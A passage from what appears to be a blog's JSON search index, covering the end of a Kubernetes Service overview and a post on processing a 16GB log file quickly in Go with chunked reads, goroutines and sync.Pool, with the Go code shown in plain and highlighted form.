\u0026#34;app=MyApp\u0026#34; 的 pod\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eselector\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eapp\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eMyApp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# Service 實際對外服務的設定\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003eprotocol\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eTCP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eport\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# 此為 Pod 對外開放的 port number\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003etargetPort\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e9376\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ePod \u0026lt;---\u0026gt; Endpoint(tcp:9376) \u0026lt;---\u0026gt; Service(tcp:80, with VIP)\u003c/code\u003e\u003c/p\u003e","tags":["URL","Kubernetes"],"title":"[Kubernetes] Service Overview"},{"categories":["URL","Go"],"contents":" 25 秒读取 16GB 文件，Go 怎么做到的？ Reading 16GB File in Seconds, Golang 打开文件后，我们有以下两个选项可以选择：\n逐行读取文件，这有助于减少内存紧张，但需要更多的时间。 一次将整个文件读入内存并处理该文件，这将消耗更多内存，但会显著减少时间。 由于文件太大，即 16 GB，因此无法将整个文件加载到内存中。但是第一种选择对我们来说也是不可行的，因为我们希望在几秒钟内处理文件。\n但你猜怎么着，还有第三种选择。瞧……相比于将整个文件加载到内存中，在 Go 语言中，我们还可以使用 bufio.NewReader()将文件分块加载。\nfunc main() { s := time.Now() args := os.Args[1:] if len(args) != 6 { // for format LogExtractor.exe -f \u0026#34;From Time\u0026#34; -t \u0026#34;To Time\u0026#34; -i \u0026#34;Log file directory location\u0026#34; fmt.Println(\u0026#34;Please give proper command line arguments\u0026#34;) return } startTimeArg := args[1] finishTimeArg := args[3] fileName := args[5] file, err := os.Open(fileName) if err != nil { fmt.Println(\u0026#34;cannot able to read the file\u0026#34;, err) return } defer file.Close() // close after checking err queryStartTime, err := time.Parse(\u0026#34;2006-01-02T15:04:05.0000Z\u0026#34;, startTimeArg) if err != nil { fmt.Println(\u0026#34;Could not able to parse the start time\u0026#34;, startTimeArg) return } queryFinishTime, err := time.Parse(\u0026#34;2006-01-02T15:04:05.0000Z\u0026#34;, finishTimeArg) if err != nil { fmt.Println(\u0026#34;Could not able to parse the finish time\u0026#34;, finishTimeArg) return } filestat, err := file.Stat() if err != nil { fmt.Println(\u0026#34;Could not able to get the file stat\u0026#34;) return } fileSize := filestat.Size() offset := fileSize - 1 lastLineSize := 0 for { b := make([]byte, 1) n, err := file.ReadAt(b, offset) if err != nil { fmt.Println(\u0026#34;Error reading file \u0026#34;, err) break } char := string(b[0]) if char == \u0026#34;\\n\u0026#34; { break } offset-- lastLineSize += n } lastLine := make([]byte, lastLineSize) _, err = file.ReadAt(lastLine, offset+1) if err != nil { fmt.Println(\u0026#34;Could not able to read last line with offset\u0026#34;, offset, \u0026#34;and lastline size\u0026#34;, lastLineSize) return } logSlice := strings.SplitN(string(lastLine), \u0026#34;,\u0026#34;, 2) logCreationTimeString := logSlice[0] lastLogCreationTime, err := time.Parse(\u0026#34;2006-01-02T15:04:05.0000Z\u0026#34;, logCreationTimeString) if err != nil { fmt.Println(\u0026#34;can not able to parse time : \u0026#34;, err) } if lastLogCreationTime.After(queryStartTime) \u0026amp;\u0026amp; lastLogCreationTime.Before(queryFinishTime) { Process(file, queryStartTime, queryFinishTime) } fmt.Println(\u0026#34;\\nTime taken - \u0026#34;, time.Since(s)) } func Process(f *os.File, start time.Time, end time.Time) error { linesPool := sync.Pool{New: func() interface{} { lines := make([]byte, 250*1024) return lines }} stringPool := sync.Pool{New: func() interface{} { lines := \u0026#34;\u0026#34; return lines }} r := bufio.NewReader(f) var wg sync.WaitGroup for { buf := linesPool.Get().([]byte) n, err := r.Read(buf) buf = buf[:n] if n == 0 { if err != nil { fmt.Println(err) break } if err == io.EOF { break } return err } nextUntillNewline, err := r.ReadBytes(\u0026#39;\\n\u0026#39;) if err != io.EOF { buf = append(buf, nextUntillNewline...) } wg.Add(1) go func() { ProcessChunk(buf, \u0026amp;linesPool, \u0026amp;stringPool, start, end) wg.Done() }() } wg.Wait() return nil } func ProcessChunk(chunk []byte, linesPool *sync.Pool, stringPool *sync.Pool, start time.Time, end time.Time) { var wg2 sync.WaitGroup logs := stringPool.Get().(string) logs = string(chunk) linesPool.Put(chunk) logsSlice := strings.Split(logs, \u0026#34;\\n\u0026#34;) stringPool.Put(logs) chunkSize := 300 n := len(logsSlice) noOfThread := n / chunkSize if n%chunkSize != 0 { noOfThread++ } for i := 0; i \u0026lt; (noOfThread); i++ { wg2.Add(1) go func(s int, e int) { defer wg2.Done() // to avaoid deadlocks for i := s; i \u0026lt; e; i++ { text := logsSlice[i] if len(text) == 0 { continue } logSlice := strings.SplitN(text, \u0026#34;,\u0026#34;, 2) logCreationTimeString := logSlice[0] logCreationTime, err := time.Parse(\u0026#34;2006-01-02T15:04:05.0000Z\u0026#34;, logCreationTimeString) if err != nil { fmt.Printf(\u0026#34;\\n Could not able to parse the time :%s for log : %v\u0026#34;, logCreationTimeString, text) return } if logCreationTime.After(start) \u0026amp;\u0026amp; logCreationTime.Before(end) { // fmt.Println(text) } } }(i*chunkSize, int(math.Min(float64((i+1)*chunkSize), float64(len(logsSlice))))) } wg2.Wait() logsSlice = nil } ","date":"November 22, 2021","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211122-processing-16gb-file-in-seconds-go-lang/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/k6k9bwpKPdfShEEiTLSJ7w\" target=\"_blank\" rel=\"noopener\"\u003e25 秒读取 16GB 文件，Go 怎么做到的？\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/swlh/processing-16gb-file-in-seconds-go-lang-3982c235dfa2\" target=\"_blank\" rel=\"noopener\"\u003eReading 16GB File in Seconds, Golang\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e打开文件后，我们有以下两个选项可以选择：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e逐行读取文件，这有助于减少内存紧张，但需要更多的时间。\u003c/li\u003e\n\u003cli\u003e一次将整个文件读入内存并处理该文件，这将消耗更多内存，但会显著减少时间。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e由于文件太大，即 16 GB，因此无法将整个文件加载到内存中。但是第一种选择对我们来说也是不可行的，因为我们希望在几秒钟内处理文件。\u003c/p\u003e\n\u003cp\u003e但你猜怎么着，还有第三种选择。瞧……相比于将整个文件加载到内存中，在 Go 语言中，我们还可以使用 bufio.NewReader()将文件分块加载。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNow\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eargs\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eArgs\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003eargs\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e { \u003cspan style=\"color:#75715e\"\u003e// for format  LogExtractor.exe -f \u0026#34;From Time\u0026#34; -t \u0026#34;To Time\u0026#34; -i \u0026#34;Log file directory location\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Please give proper command line arguments\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003estartTimeArg\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eargs\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efinishTimeArg\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eargs\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efileName\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eargs\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efile\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOpen\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003efileName\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cannot able to read the file\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efile\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eClose\u003c/span\u003e() \u003cspan style=\"color:#75715e\"\u003e// close after checking err\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003equeryStartTime\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eParse\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2006-01-02T15:04:05.0000Z\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003estartTimeArg\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Could not able to parse the start time\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003estartTimeArg\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003equeryFinishTime\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eParse\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2006-01-02T15:04:05.0000Z\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003efinishTimeArg\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Could not able to parse the finish time\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003efinishTimeArg\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efilestat\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efile\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStat\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Could not able to get the file stat\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efileSize\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efilestat\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSize\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eoffset\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efileSize\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elastLineSize\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efile\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadAt\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eoffset\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Error reading file \u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003echar\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e string(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echar\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\\n\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eoffset\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e--\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003elastLineSize\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elastLine\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003elastLineSize\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003efile\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadAt\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003elastLine\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eoffset\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Could not able to read last line with offset\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eoffset\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;and lastline size\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003elastLineSize\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elogSlice\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estrings\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSplitN\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003elastLine\u003c/span\u003e), \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;,\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elogCreationTimeString\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elogSlice\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elastLogCreationTime\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eParse\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2006-01-02T15:04:05.0000Z\u0026#34;\u003c/span\u003e, 